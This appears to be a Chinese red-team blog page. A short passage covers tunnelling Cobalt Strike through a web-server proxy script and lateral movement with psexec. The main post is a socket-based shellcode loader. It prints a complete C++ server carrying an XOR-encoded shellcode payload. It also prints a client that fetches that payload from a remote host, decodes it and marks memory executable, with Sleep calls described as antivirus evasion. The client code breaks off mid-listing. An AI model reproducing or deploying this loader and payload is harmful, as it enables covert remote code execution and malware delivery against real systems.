<p>Kali上执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;stinger_client -w http:&#x2F;&#x2F;192.168.111.132:81&#x2F;proxy.php -l 127.0.0.1 -p 60000</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/97c6949c-ef85-4518-a49f-78afbb0a1783.png"></a></p>
<p>cs中新建listener，192.168.204.188为web服务器内网ip，60020为转发端口</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/80fc1a27-bcad-4ce4-964b-b826df97b771.png"></a></p>
<p>使用psexec横向移动，选择listener为stinger，成功上线</p>
<p><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d324ea94-6ba5-404e-9659-a4dd33c33d5d.png"></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/snowming/2ec80f7823e0">Cobalt Strike Listener with Proxy          </a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/45AKbRS677fxynKW6Qfz7w">红队攻防实践：不出网主机搭建内网隧道新思路</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/107840269">dns与smb beacon详解与一种内网穿透方法的实践</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/247287.html">内网渗透：不出网渗透技巧</a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/247287.html">https://www.freebuf.com/articles/web/247287.html</a>)</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-12-13T08:20:05.000Z" title="2020-12-13T08:20:05.000Z">2020-12-13</time>发表</span><span class="level-item"><time dateTime="2020-12-13T08:43:03.659Z" title="2020-12-13T08:43:03.659Z">2020-12-13</time>更新</span><span class="level-item">15 分钟读完 (大约2178个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/">利用SOCKET分离shellcode</a></h1><div class="content"><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>客户端运行后向服务端发起请求接收xor运算后的shellcode还原后执行，达到远程加载shellcode的目的，与stager的功能有些类似。</p>
<h2 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> BUF_SIZE = <span class="number">1024</span>;</span><br><span class="line">	WSADATA         wsd;            <span class="comment">//WSADATA变量</span></span><br><span class="line">	SOCKET          sServer;        <span class="comment">//服务器套接字</span></span><br><span class="line">	SOCKET          sClient;        <span class="comment">//客户端套接字</span></span><br><span class="line">	SOCKADDR_IN     addrServ;;      <span class="comment">//服务器地址</span></span><br><span class="line">	<span class="keyword">char</span>            buf[BUF_SIZE];  <span class="comment">//接收数据缓冲区</span></span><br><span class="line">	<span class="keyword">char</span>			sendBuf[] = <span class="string">&quot;\x6b\xdf\x14\x73\x67\x7f\x5f\x97\x97\x97\xd6\xc6\xd6\xc7\xc5\xc6\xc1\xdf\xa6\x45\xf2\xdf\x1c\xc5\xf7\xdf\x1c\xc5\x8f\xdf\x1c\xc5\xb7\xdf\x1c\xe5\xc7\xdf\x98\x20\xdd\xdd\xda\xa6\x5e\xdf\xa6\x57\x3b\xab\xf6\xeb\x95\xbb\xb7\xd6\x56\x5e\x9a\xd6\x96\x56\x75\x7a\xc5\xd6\xc6\xdf\x1c\xc5\xb7\x1c\xd5\xab\xdf\x96\x47\xf1\x16\xef\x8f\x9c\x95\xe2\xe5\x1c\x17\x1f\x97\x97\x97\xdf\x12\x57\xe3\xf0\xdf\x96\x47\xc7\x1c\xdf\x8f\xd3\x1c\xd7\xb7\xde\x96\x47\x74\xc1\xdf\x68\x5e\xd6\x1c\xa3\x1f\xdf\x96\x41\xda\xa6\x5e\xdf\xa6\x57\x3b\xd6\x56\x5e\x9a\xd6\x96\x56\xaf\x77\xe2\x66\xdb\x94\xdb\xb3\x9f\xd2\xae\x46\xe2\x4f\xcf\xd3\x1c\xd7\xb3\xde\x96\x47\xf1\xd6\x1c\x9b\xdf\xd3\x1c\xd7\x8b\xde\x96\x47\xd6\x1c\x93\x1f\xdf\x96\x47\xd6\xcf\xd6\xcf\xc9\xce\xcd\xd6\xcf\xd6\xce\xd6\xcd\xdf\x14\x7b\xb7\xd6\xc5\x68\x77\xcf\xd6\xce\xcd\xdf\x1c\x85\x7e\xd8\x68\x68\x68\xca\xfd\x97\xde\x29\xe0\xfe\xf9\xfe\xf9\xf2\xe3\x97\xd6\xc1\xde\x1e\x71\xdb\x1e\x66\xd6\x2d\xdb\xe0\xb1\x90\x68\x42\xdf\xa6\x5e\xdf\xa6\x45\xda\xa6\x57\xda\xa6\x5e\xd6\xc7\xd6\xc7\xd6\x2d\xad\xc1\xee\x30\x68\x42\x7c\xe4\xcd\xdf\x1e\x56\xd6\x2f\xc7\x97\x97\x97\xda\xa6\x5e\xd6\xc6\xd6\xc6\xfd\x94\xd6\xc6\xd6\x2d\xc0\x1e\x08\x51\x68\x42\x7c\xce\xcc\xdf\x1e\x56\xdf\xa6\x45\xde\x1e\x4f\xda\xa6\x5e\xc5\xff\x97\x95\xd7\x13\xc5\xc5\xd6\x2d\x7c\xc2\xb9\xac\x68\x42\xdf\x1e\x51\xdf\x14\x54\xc7\xfd\x9d\xc8\xdf\x1e\x66\xdf\x1e\x4d\xde\x50\x57\x68\x68\x68\x68\xda\xa6\x5e\xc5\xc5\xd6\x2d\xba\x91\x8f\xec\x68\x42\x12\x57\x98\x12\x0a\x96\x97\x97\xdf\x68\x58\x98\x13\x1b\x96\x97\x97\x7c\x44\x7e\x73\x96\x97\x97\x7f\x35\x68\x68\x68\xb8\xff\xd3\xd9\xf4\x97\x9b\x88\x75\x09\xbe\x35\xdc\xd7\x35\x98\xd0\x2d\xbe\xa9\x5b\x83\x00\xa1\xc6\x5a\xa4\x4c\xbd\xd2\x20\xcc\x66\x45\x97\x24\xda\x15\x40\x32\xe1\xb7\x8c\xa2\xfa\xa2\xa0\x20\x67\x69\x1c\x02\xe1\x54\x4e\x8a\x79\x2c\xf0\xa7\x4b\x7d\xd5\xb9\x3d\xee\x1a\x4a\xf5\xa7\x74\x8d\x66\xed\x9a\x43\xf5\x3f\x5a\x97\xc2\xe4\xf2\xe5\xba\xd6\xf0\xf2\xf9\xe3\xad\xb7\xda\xf8\xed\xfe\xfb\xfb\xf6\xb8\xa3\xb9\xa7\xb7\xbf\xf4\xf8\xfa\xe7\xf6\xe3\xfe\xf5\xfb\xf2\xac\xb7\xda\xc4\xde\xd2\xb7\xaf\xb9\xa7\xac\xb7\xc0\xfe\xf9\xf3\xf8\xe0\xe4\xb7\xd9\xc3\xb7\xa2\xb9\xa6\xac\xb7\xc3\xe5\xfe\xf3\xf2\xf9\xe3\xb8\xa3\xb9\xa7\xac\xb7\xb9\xd9\xd2\xc3\xb7\xd4\xdb\xc5\xb7\xa6\xb9\xa6\xb9\xa3\xa4\xa5\xa5\xac\xb7\xd5\xd8\xde\xd2\xaf\xac\xd2\xd9\xc2\xc4\xbe\x9a\x9d\x97\xba\x40\x2a\xb6\xce\x2c\x01\xae\x0c\x64\x70\x02\xfb\xbf\x3b\x14\x9d\x54\xb9\x76\xe2\x9c\x2a\x5d\x28\x08\x2f\xcd\x21\x52\x5c\x57\xe0\xfd\x14\x8a\x95\xaf\x66\xc1\x23\x70\x97\xe4\xb2\xd6\xf7\xd0\x3a\xf6\xf7\xcd\x87\x96\xb2\x0f\xef\x11\x6b\x1c\x22\x4d\xc4\xed\x65\xce\x0a\xab\x30\x94\xd2\xdc\x8d\xbf\x3a\xa6\xc9\xe0\x5e\x93\x89\x10\x47\xfa\x96\xac\xb7\x70\xdd\x93\x41\x7b\x62\x5d\x35\xe1\x35\x8b\x4a\x50\x07\x38\x1f\xb8\x10\x92\xe0\x08\xcb\xdb\x79\x8c\xbe\x94\xcb\xc0\xb2\x70\x70\xac\x36\xbd\x83\x76\x46\xde\xfc\x4a\xac\x0b\x30\x69\x57\x05\x69\xac\x1f\xec\xba\x09\x8f\x62\xe8\x4f\xcd\xe2\x35\x07\xbe\xab\xaf\x7c\x64\x8a\x01\xf5\x92\xe2\x9c\xda\x28\x7f\xd5\xc3\x0d\xa3\x8f\x8b\x97\x63\x34\xfa\x7e\xe9\xd7\x5e\x5b\x7b\xb5\xb3\x47\xa8\xe3\x8f\x37\xd0\x2a\x30\xb1\xc0\x32\xe8\xd9\x53\x97\xd6\x29\x67\x22\x35\xc1\x68\x42\xdf\xa6\x5e\x2d\x97\x97\xd7\x97\xd6\x2f\x97\x87\x97\x97\xd6\x2e\xd7\x97\x97\x97\xd6\x2d\xcf\x33\xc4\x72\x68\x42\xdf\x04\xc4\xc4\xdf\x1e\x70\xdf\x1e\x66\xdf\x1e\x4d\xd6\x2f\x97\xb7\x97\x97\xde\x1e\x6e\xd6\x2d\x85\x01\x1e\x75\x68\x42\xdf\x14\x53\xb7\x12\x57\xe3\x21\xf1\x1c\x90\xdf\x96\x54\x12\x57\xe2\x40\xcf\xcf\xcf\xdf\x92\x97\x97\x97\x97\xc7\x54\x7f\x08\x6a\x68\x68\xa6\xae\xa5\xb9\xa6\xa1\xaf\xb9\xa6\xa6\xa6\xb9\xa6\xa4\xa7\x97\x85\xa3\xc1\xef&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span>             retVal;         <span class="comment">//返回值</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;USAGE: server.exe &lt;Listen Port&gt;&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsd) != <span class="number">0</span>)<span class="comment">//初始化套结字动态库</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WSAStartup failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建套接字</span></span><br><span class="line">	sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_SOCKET == sServer)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Socket Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		WSACleanup();<span class="comment">//释放套接字资源;</span></span><br><span class="line">		<span class="keyword">return</span>  <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//服务器套接字地址</span></span><br><span class="line">	addrServ.sin_family = AF_INET;</span><br><span class="line">	addrServ.sin_port = htons((<span class="keyword">short</span>)atoi(argv[<span class="number">1</span>]));;</span><br><span class="line">	addrServ.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//绑定套接字</span></span><br><span class="line">	retVal = bind(sServer, (LPSOCKADDR)&amp;addrServ, <span class="keyword">sizeof</span>(SOCKADDR_IN));</span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == retVal)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bind Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">		WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//开始监听 </span></span><br><span class="line">	retVal = listen(sServer, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == retVal)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Listen Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">		WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;开始监听中....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//接受客户端请求</span></span><br><span class="line">	sockaddr_in addrClient;</span><br><span class="line">	<span class="keyword">int</span> addrClientlen = <span class="keyword">sizeof</span>(addrClient);</span><br><span class="line">	sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen); <span class="comment">// 生成对应当前客户端连接的套接字sClient</span></span><br><span class="line">	<span class="keyword">if</span> (INVALID_SOCKET == sClient)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accept Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">		WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> flag = <span class="number">1</span>; <span class="comment">//只接收一次</span></span><br><span class="line">	<span class="keyword">while</span> (flag)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//接收客户端数据</span></span><br><span class="line">		ZeroMemory(buf, BUF_SIZE); <span class="comment">// 填充为0 防止内存分配发生意外</span></span><br><span class="line"></span><br><span class="line">		retVal = recv(sClient, buf, BUF_SIZE, <span class="number">0</span>); <span class="comment">// 接收数据放在buf缓冲区</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (SOCKET_ERROR == retVal) <span class="comment">//判断是否接收错误</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Recv Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">			closesocket(sClient);   <span class="comment">//关闭套接字     </span></span><br><span class="line">			WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;成功建立通信&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		send(sClient, sendBuf, <span class="keyword">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;向客户端发送shellcode...&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;发送shellcode成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//退出</span></span><br><span class="line">	closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">	closesocket(sClient);   <span class="comment">//关闭套接字</span></span><br><span class="line">	WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)  <span class="comment">//添加ws2_32动态库</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996) <span class="comment">//忽略旧函数使用的警告</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> BUF_SIZE = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">	WSADATA			wsd; <span class="comment">//WSADATA变量</span></span><br><span class="line">	SOCKET			sHost; <span class="comment">// 服务器套接字socket</span></span><br><span class="line">	SOCKADDR_IN		servAddr; <span class="comment">//服务器地址</span></span><br><span class="line">	<span class="keyword">char</span>			buf[BUF_SIZE]; <span class="comment">// 存放发送的数据缓冲区</span></span><br><span class="line">	<span class="keyword">char</span>			bufRecv[BUF_SIZE]; <span class="comment">//接收收到的数据缓冲区</span></span><br><span class="line">	DWORD			dwThreadId;</span><br><span class="line">	HANDLE			hThread;</span><br><span class="line">	DWORD			dwOldProtect;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> retVal; <span class="comment">// 返回值</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;USAGE: client.exe &lt;Server IP&gt; &lt;Server PORT&gt;&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsd) != <span class="number">0</span>) <span class="comment">//初始化套结字动态库</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WSAStartup failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sHost = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>); <span class="comment">//创建套接字 IPV4  可靠的，双向的类型服务提供商选择</span></span><br><span class="line">	<span class="keyword">if</span> (INVALID_SOCKET == sHost)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;socket failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span>  <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置服务器的地址</span></span><br><span class="line">	servAddr.sin_family = AF_INET; <span class="comment">//指定IPV4</span></span><br><span class="line">	servAddr.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]); <span class="comment">// 指定服务器的地址</span></span><br><span class="line">	servAddr.sin_port = htons((<span class="keyword">short</span>)atoi(argv[<span class="number">2</span>])); <span class="comment">// 指定服务器的端口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, <span class="keyword">sizeof</span>(servAddr)); <span class="comment">// 套接字 sockaddr的指针，也就是地址 第三个参数为SOCKADDR_IN结构体的大小</span></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == retVal) <span class="comment">//判断是否连接成功</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;connect failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		closesocket(sHost);</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ZeroMemory(buf, BUF_SIZE); <span class="comment">// buf指向的地址用0来填充</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buf, <span class="string">&quot;ok&quot;</span>); <span class="comment">//给ok两个字节的字符串复制给buf区段</span></span><br><span class="line"></span><br><span class="line">	retVal = send(sHost, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>); <span class="comment">//send的返回值</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == retVal) <span class="comment">//判断是否发送成功</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;send failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		closesocket(sHost);</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting Download Payload&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	ZeroMemory(bufRecv, BUF_SIZE); <span class="comment">// bufRevc指向的地址用0来填充</span></span><br><span class="line">	Sleep(<span class="number">2000</span>); <span class="comment">//延迟两秒起到免杀绕过的效果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	recv(sHost, bufRecv, BUF_SIZE, <span class="number">0</span>); <span class="comment">//bufRecv缓冲区接收 服务端发送来的数据</span></span><br><span class="line"></span><br><span class="line">	Sleep(<span class="number">4000</span>);</span><br><span class="line">	closesocket(sHost);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(bufRecv); i++) &#123; <span class="comment">//采取倾旋的方式来进行异或解密</span></span><br><span class="line">		<span class="comment">//Sleep(50);</span></span><br><span class="line">		_InterlockedXor8(bufRecv + i, <span class="number">0x97</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;加载shellcode中&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//下面就是开辟内存存储shellcode 创建线程进行执行</span></span><br><span class="line">	<span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)VirtualAlloc(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		BUF_SIZE,</span><br><span class="line">		MEM_COMMIT,</span><br><span class="line">		PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	CopyMemory(shellcode, bufRecv, BUF_SIZE);</span><br><span class="line">	VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &amp;dwOldProtect); <span class="comment">// VirtualProtect改变它的属性 -&gt; 可执行</span></span><br><span class="line"></span><br><span class="line">	